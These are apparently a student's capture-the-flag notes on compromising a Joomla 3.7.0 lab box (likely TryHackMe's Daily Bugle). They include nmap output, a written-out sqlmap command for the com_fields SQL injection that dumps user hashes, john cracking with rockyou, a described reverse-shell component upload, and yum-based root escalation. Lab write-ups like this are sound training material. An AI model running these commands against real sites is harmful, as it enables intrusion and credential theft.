# Scan
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 17:35 EDT
Nmap scan report for 10.10.50.18
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.60 seconds

* see spiderman robbed bank

# foothold
* find way in 
see joomla endpoints
can access /administrator
Google how to find version and see at http://10.10.50.18//administrator/manifests/files/joomla.xml
	gives manifest file saying that version is 3.7.0
searchsploit
'''pat@kali:~/Desktop/Cert_Prep/thm/dailybugle$ searchsploit joomla | grep 3.7.0'''
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                              | exploits/php/webapps/42033.txt

* exploit for hash 

Not sure why nmap scan doesn't say that it's vulnerable?
'''
pat@kali:~/Desktop/Cert_Prep/thm/dailybugle$ /usr/bin/nmap --script http-vuln-cve2017-8917.nse --script-args=http-vuln-cve2017-8917.uri=joomla/ -p 80 10.10.50.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 18:18 EDT
Nmap scan report for 10.10.50.18
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
'''


Run second command in that script and get:
If difficulties persist, please contact the System Administrator of this site and report the error below.

    500 Duplicate entry <> for key 'group_key' 


Doesn't seem to be useful. Rerun the sqlmap command but instead of --dbs use --dump-all to get tables
Joomblah would be an alternative also. I'm just dumb and it didn't work at first. 
Holy fuck the sqlmap dump all is crazy. Go back to manual to only enumerate what I want. 
'''
pat@kali:~/Desktop/Cert_Prep/thm/dailybugle$ sqlmap -u "http://10.10.50.18/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
'''
Yes to user common columns. Get output. 

* Crack johns password
'''
pat@kali:~/Desktop/Cert_Prep/thm/dailybugle$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
Using default input encoding: UTF-8                                                                                                                                                                              
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])                                                                                                                                                              
Cost 1 (iteration count) is 1024 for all loaded hashes                                                                                                                                                           
Will run 4 OpenMP threads                                                                                                                                                                                        
Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                                                                                    
0g 0:00:02:40 0.22% (ETA: 00:36:10) 0g/s 243.3p/s 243.3c/s 243.3C/s solomio..sanne                                                                                                                               
<>     (jonah)                                                                                                                                                                                         
1g 0:00:03:11 DONE (2020-05-07 04:53) 0.005210g/s 244.0p/s 244.0c/s 244.0C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
'''

* use pw for access
access admin page

* exploit admin page
tried to upload a shell to media, didn't work
uploaded extension with reverse shell from this template: https://docs.joomla.org/J3.x:Developing_an_MVC_Component/Developing_a_Basic_Component#helloworld.xml
went to components and clicked on it and got callback
get user shell

# Escalate
* get user flag
can't ssh as jjameson
can't read his flag
can't su to jjameson
copy over and run linpeas, save output to txt file and download 
see jjameson can run yum
look at gtfobins for yum, make shell script and follow steps
nevermind, it says that jjameson can run yum. Use that later. 
Back to shell or linpeas, see in config file, there's public $password = <>;
  use that to try su to jjameson
read flag
* get root flag
Back to yum stuff
run commands from gtfobins
get root

